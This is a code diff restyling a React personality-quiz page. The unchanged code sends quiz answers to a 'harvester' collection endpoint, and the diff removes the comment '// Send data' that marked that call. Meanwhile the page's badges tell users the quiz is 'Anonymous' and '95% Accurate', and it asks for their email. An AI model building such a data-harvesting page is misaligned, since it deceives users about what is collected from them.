@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { Box, Button, Typography, Container, Card, CardContent, LinearProgress, Radio, RadioGroup, FormControlLabel, TextField, AppBar, Toolbar, Paper, Avatar } from '@mui/material';
+import { Box, Button, Typography, Container, Card, CardContent, LinearProgress, Radio, RadioGroup, FormControlLabel, TextField, AppBar, Toolbar, Paper, Avatar, Fade, Grow } from '@mui/material';
 import harvester from '../harvester/HarvesterCore';
 
 const questions = [
@@ -122,7 +122,6 @@ export default function QuizPage() {
     if (step < questions.length - 1) {
       setTimeout(() => setStep(step + 1), 200);
     } else {
-      // Send data
       const type = determineResult();
       harvester.send('/api/collect/formdata', {
         formId: 'personality-quiz',
@@ -153,61 +152,110 @@ export default function QuizPage() {
 
   if (result) {
     return (
-      <Box sx={{ minHeight: '100vh', bgcolor: '#f8f9fa', py: 4 }}>
+      <Box sx={{ minHeight: '100vh', bgcolor: '#f8f9fa', py: 4, px: 2 }}>
         <Container maxWidth="sm">
-          <Card elevation={3} sx={{ borderRadius: 3, overflow: 'hidden' }}>
-            <Box sx={{ bgcolor: result.color, p: 4, textAlign: 'center' }}>
-              <Typography sx={{ fontSize: '4rem' }}>{result.emoji}</Typography>
-              <Typography variant="h4" sx={{ color: '#fff', fontWeight: 800, mt: 2 }}>
-                {result.title}
-              </Typography>
-            </Box>
-            <CardContent sx={{ p: 3 }}>
-              <Typography sx={{ color: '#555', lineHeight: 1.7, mb: 3 }}>
-                {result.description}
-              </Typography>
-              <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap', mb: 3 }}>
-                {result.traits.map((trait) => (
-                  <Box key={trait} sx={{ bgcolor: `${result.color}15`, color: result.color, px: 2, py: 0.5, borderRadius: 20, fontWeight: 600, fontSize: '0.85rem' }}>
-                    {trait}
-                  </Box>
-                ))}
+          <Fade in={true}>
+            <Card elevation={3} sx={{ borderRadius: '20px', overflow: 'hidden' }}>
+              <Box sx={{ 
+                background: `linear-gradient(135deg, ${result.color}, ${result.color}DD)`, 
+                p: 4, 
+                textAlign: 'center',
+                position: 'relative'
+              }}>
+                <Box sx={{
+                  position: 'absolute', top: -40, right: -40, width: 200, height: 200,
+                  borderRadius: '50%', background: 'rgba(255,255,255,0.06)'
+                }} />
+                <Typography sx={{ fontSize: '4.5rem', position: 'relative', zIndex: 1 }}>{result.emoji}</Typography>
+                <Typography variant="h4" sx={{ color: '#fff', fontWeight: 800, mt: 2, position: 'relative', zIndex: 1 }}>
+                  {result.title}
+                </Typography>
               </Box>
-              <Box sx={{ bgcolor: '#f0f4ff', borderRadius: 2, p: 2.5, mb: 2 }}>
-                <Typography sx={{ fontWeight: 600, color: '#333', mb: 1, fontSize: '0.95rem' }}>
-                  📧 Get Your Full Personality Report
+              <CardContent sx={{ p: 3.5 }}>
+                <Typography sx={{ color: '#475569', lineHeight: 1.8, mb: 3, fontSize: '0.92rem' }}>
+                  {result.description}
                 </Typography>
-                <Typography sx={{ color: '#888', fontSize: '0.85rem', mb: 1.5 }}>
-                  Enter your email to receive a detailed 10-page analysis of your personality type.
-                </Typography>
-                <Box sx={{ display: 'flex', gap: 1 }}>
-                  <TextField
-                    size="small"
-                    placeholder="your@email.com"
-                    value={email}
-                    onChange={(e) => setEmail(e.target.value)}
-                    sx={{ flex: 1, '& .MuiOutlinedInput-root': { bgcolor: '#fff' } }}
-                  />
-                  <Button
-                    variant="contained"
-                    onClick={handleEmailSubmit}
-                    disabled={!email}
-                    sx={{ bgcolor: result.color, '&:hover': { opacity: 0.9 }, whiteSpace: 'nowrap' }}
-                  >
-                    Send Report
-                  </Button>
+                <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap', mb: 3 }}>
+                  {result.traits.map((trait) => (
+                    <Box key={trait} sx={{ 
+                      bgcolor: `${result.color}12`, 
+                      color: result.color, 
+                      px: 2.5, 
+                      py: 0.8, 
+                      borderRadius: '20px', 
+                      fontWeight: 600, 
+                      fontSize: '0.82rem',
+                      border: `1px solid ${result.color}25`
+                    }}>
+                      {trait}
+                    </Box>
+                  ))}
                 </Box>
-              </Box>
-              <Button
-                variant="outlined"
-                fullWidth
-                onClick={() => { setStep(0); setAnswers({}); setResult(null); }}
-                sx={{ borderColor: '#ddd', color: '#888', mt: 1 }}
-              >
-                Take Quiz Again
-              </Button>
-            </CardContent>
-          </Card>
+                <Paper sx={{ 
+                  bgcolor: '#f8fafc', 
+                  borderRadius: '14px', 
+                  p: 2.5, 
+                  mb: 2.5,
+                  border: '1px solid #e2e8f0'
+                }}>
+                  <Typography sx={{ fontWeight: 700, color: '#0f172a', mb: 1, fontSize: '0.95rem' }}>
+                    📧 Get Your Full Personality Report
+                  </Typography>
+                  <Typography sx={{ color: '#94a3b8', fontSize: '0.85rem', mb: 1.5 }}>
+                    Enter your email to receive a detailed 10-page analysis of your personality type.
+                  </Typography>
+                  <Box sx={{ display: 'flex', gap: 1 }}>
+                    <TextField
+                      size="small"
+                      placeholder="your@email.com"
+                      value={email}
+                      onChange={(e) => setEmail(e.target.value)}
+                      sx={{ 
+                        flex: 1, 
+                        '& .MuiOutlinedInput-root': { 
+                          bgcolor: '#fff',
+                          borderRadius: '10px',
+                          '& fieldset': { borderColor: '#e2e8f0' },
+                        }
+                      }}
+                    />
+                    <Button
+                      variant="contained"
+                      onClick={handleEmailSubmit}
+                      disabled={!email}
+                      sx={{ 
+                        bgcolor: result.color, 
+                        '&:hover': { opacity: 0.9 }, 
+                        whiteSpace: 'nowrap',
+                        borderRadius: '10px',
+                        textTransform: 'none',
+                        fontWeight: 600,
+                        px: 2.5
+                      }}
+                    >
+                      Send Report
+                    </Button>
+                  </Box>
+                </Paper>
+                <Button
+                  variant="outlined"
+                  fullWidth
+                  onClick={() => { setStep(0); setAnswers({}); setResult(null); }}
+                  sx={{ 
+                    borderColor: '#e2e8f0', 
+                    color: '#64748b', 
+                    mt: 1,
+                    borderRadius: '10px',
+                    textTransform: 'none',
+                    fontWeight: 600,
+                    py: 1
+                  }}
+                >
+                  Take Quiz Again
+                </Button>
+              </CardContent>
+            </Card>
+          </Fade>
         </Container>
       </Box>
     );
@@ -217,71 +265,104 @@ export default function QuizPage() {
   const current = questions[step];
 
   return (
-    <Box sx={{ minHeight: '100vh', bgcolor: '#f0f2f5', py: 4 }}>
+    <Box sx={{ minHeight: '100vh', bgcolor: '#f0f2f5', py: 4, px: 2 }}>
       <Container maxWidth="sm">
         {/* Quiz Card */}
-        <Card elevation={3} sx={{ borderRadius: 3, overflow: 'hidden' }}>
-          <Box sx={{ bgcolor: '#fff', p: 2.5, borderBottom: '1px solid #eee' }}>
-            <Box sx={{ display: 'flex', alignItems: 'center', mb: 1.5 }}>
-              <Box sx={{ bgcolor: '#667eea', borderRadius: '50%', width: 36, height: 36, display: 'flex', alignItems: 'center', justifyContent: 'center', mr: 1.5 }}>
-                <Typography sx={{ color: '#fff', fontWeight: 700, fontSize: '0.85rem' }}>QP</Typography>
+        <Grow in={true} key={step}>
+          <Card elevation={0} sx={{ 
+            borderRadius: '20px', 
+            overflow: 'hidden',
+            border: '1px solid #e2e8f0',
+            boxShadow: '0 4px 24px rgba(0,0,0,0.06)'
+          }}>
+            <Box sx={{ p: 2.5, borderBottom: '1px solid #e2e8f0' }}>
+              <Box sx={{ display: 'flex', alignItems: 'center', mb: 1.5 }}>
+                <Box sx={{
+                  background: 'linear-gradient(135deg, #667eea, #764ba2)',
+                  borderRadius: '12px', width: 40, height: 40,
+                  display: 'flex', alignItems: 'center', justifyContent: 'center',
+                  mr: 1.5,
+                  boxShadow: '0 4px 12px rgba(102,126,234,0.3)'
+                }}>
+                  <Typography sx={{ color: '#fff', fontWeight: 800, fontSize: '0.85rem' }}>QP</Typography>
+                </Box>
+                <Box>
+                  <Typography sx={{ fontWeight: 700, color: '#0f172a', fontSize: '0.95rem' }}>Personality Quiz</Typography>
+                  <Typography sx={{ color: '#94a3b8', fontSize: '0.75rem' }}>Question {step + 1} of {questions.length}</Typography>
+                </Box>
               </Box>
-              <Box>
-                <Typography sx={{ fontWeight: 700, color: '#333', fontSize: '0.95rem' }}>Personality Quiz</Typography>
-                <Typography sx={{ color: '#888', fontSize: '0.75rem' }}>Question {step + 1} of {questions.length}</Typography>
-              </Box>
+              <LinearProgress
+                variant="determinate"
+                value={progress}
+                sx={{ 
+                  height: 6, borderRadius: '3px', bgcolor: '#f1f5f9', 
+                  '& .MuiLinearProgress-bar': { 
+                    background: 'linear-gradient(90deg, #667eea, #764ba2)', 
+                    borderRadius: '3px' 
+                  } 
+                }}
+              />
             </Box>
-            <LinearProgress
-              variant="determinate"
-              value={progress}
-              sx={{ height: 6, borderRadius: 3, bgcolor: '#e8e8e8', '& .MuiLinearProgress-bar': { bgcolor: '#667eea', borderRadius: 3 } }}
-            />
-          </Box>
 
-          <CardContent sx={{ p: 3 }}>
-            <Typography variant="h6" sx={{ fontWeight: 700, color: '#222', mb: 3, lineHeight: 1.4, fontSize: '1.1rem' }}>
-              {current.question}
-            </Typography>
+            <CardContent sx={{ p: 3 }}>
+              <Typography variant="h6" sx={{ 
+                fontWeight: 700, color: '#0f172a', mb: 3, 
+                lineHeight: 1.4, fontSize: '1.1rem' 
+              }}>
+                {current.question}
+              </Typography>
 
-            <RadioGroup value={answers[step]?.toString() || ''} onChange={(e) => handleAnswer(e.target.value)}>
-              {current.options.map((option, idx) => (
-                <Paper
-                  key={idx}
-                  elevation={0}
-                  sx={{
-                    mb: 1,
-                    border: answers[step] === idx ? '2px solid #667eea' : '2px solid #e8e8e8',
-                    borderRadius: 2,
-                    transition: 'all 0.15s',
-                    '&:hover': { borderColor: '#667eea', bgcolor: '#f5f7ff' },
-                    bgcolor: answers[step] === idx ? '#f0f4ff' : '#fff'
-                  }}
-                >
-                  <FormControlLabel
-                    value={idx.toString()}
-                    control={<Radio sx={{ '&.Mui-checked': { color: '#667eea' }, ml: 1 }} />}
-                    label={<Typography sx={{ color: '#444', fontWeight: answers[step] === idx ? 600 : 400, py: 1, pr: 1 }}>{option}</Typography>}
-                    sx={{ width: '100%', m: 0, px: 1 }}
-                  />
-                </Paper>
-              ))}
-            </RadioGroup>
-          </CardContent>
-        </Card>
+              <RadioGroup value={answers[step]?.toString() || ''} onChange={(e) => handleAnswer(e.target.value)}>
+                {current.options.map((option, idx) => (
+                  <Paper
+                    key={idx}
+                    elevation={0}
+                    sx={{
+                      mb: 1.2,
+                      border: answers[step] === idx ? '2px solid #667eea' : '2px solid #e8e8e8',
+                      borderRadius: '14px',
+                      transition: 'all 0.2s cubic-bezier(0.4, 0, 0.2, 1)',
+                      '&:hover': { borderColor: '#667eea', bgcolor: '#f5f7ff' },
+                      bgcolor: answers[step] === idx ? '#f0f4ff' : '#fff',
+                      transform: answers[step] === idx ? 'scale(1.01)' : 'scale(1)'
+                    }}
+                  >
+                    <FormControlLabel
+                      value={idx.toString()}
+                      control={<Radio sx={{ 
+                        '&.Mui-checked': { color: '#667eea' }, 
+                        ml: 1.5,
+                        '& .MuiSvgIcon-root': { fontSize: 22 }
+                      }} />}
+                      label={<Typography sx={{ 
+                        color: '#475569', 
+                        fontWeight: answers[step] === idx ? 600 : 400, 
+                        py: 1.2, 
+                        pr: 1.5,
+                        fontSize: '0.92rem'
+                      }}>{option}</Typography>}
+                      sx={{ width: '100%', m: 0, px: 1 }}
+                    />
+                  </Paper>
+                ))}
+              </RadioGroup>
+            </CardContent>
+          </Card>
+        </Grow>
 
         {/* Trust indicators */}
         <Box sx={{ textAlign: 'center', mt: 3, display: 'flex', justifyContent: 'center', gap: 3, flexWrap: 'wrap' }}>
-          <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5 }}>
-            <Typography sx={{ color: '#2ecc71', fontSize: '1rem' }}>🔒</Typography>
-            <Typography sx={{ color: '#888', fontSize: '0.75rem' }}>Anonymous</Typography>
+          <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.8 }}>
+            <Box sx={{ fontSize: '1rem' }}>🔒</Box>
+            <Typography sx={{ color: '#94a3b8', fontSize: '0.78rem', fontWeight: 500 }}>Anonymous</Typography>
           </Box>
-          <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5 }}>
-            <Typography sx={{ color: '#f39c12', fontSize: '1rem' }}>⭐</Typography>
-            <Typography sx={{ color: '#888', fontSize: '0.75rem' }}>12M+ Taken</Typography>
+          <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.8 }}>
+            <Box sx={{ fontSize: '1rem' }}>⭐</Box>
+            <Typography sx={{ color: '#94a3b8', fontSize: '0.78rem', fontWeight: 500 }}>12M+ Taken</Typography>
           </Box>
-          <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5 }}>
-            <Typography sx={{ color: '#3498db', fontSize: '1rem' }}>📊</Typography>
-            <Typography sx={{ color: '#888', fontSize: '0.75rem' }}>95% Accurate</Typography>
+          <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.8 }}>
+            <Box sx={{ fontSize: '1rem' }}>📊</Box>
+            <Typography sx={{ color: '#94a3b8', fontSize: '0.78rem', fontWeight: 500 }}>95% Accurate</Typography>
           </Box>
         </Box>
       </Container>
